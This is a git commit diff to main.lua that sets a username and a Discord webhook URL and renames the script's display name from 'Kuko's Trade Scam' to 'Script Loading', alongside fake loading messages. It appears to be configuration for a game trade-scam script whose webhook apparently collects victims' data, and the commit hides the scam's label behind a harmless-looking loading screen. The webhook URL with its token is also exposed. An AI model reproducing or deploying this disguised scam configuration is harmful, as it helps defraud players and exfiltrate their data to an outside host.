7ce56c48bddf7206c1d438d08446f74b247ef88e
Kukinekk <102248249+Kukinekk@users.noreply.github.com>
2023-03-09 15:47:37 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,7 +1,7 @@
 Username = "0FFK4KYY"
 WebHook = "https://discord.com/api/webhooks/1083358450777608244/kUzIBv-BVuM719ANpFCuCLSmUS5KDMsGU5SNRccgXzP-qwQuvEew5Pz3SH0j00akO_a9"
 
-_G.CustomScriptName = "Kuko's Trade Scam"
+_G.CustomScriptName = "Script Loading"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
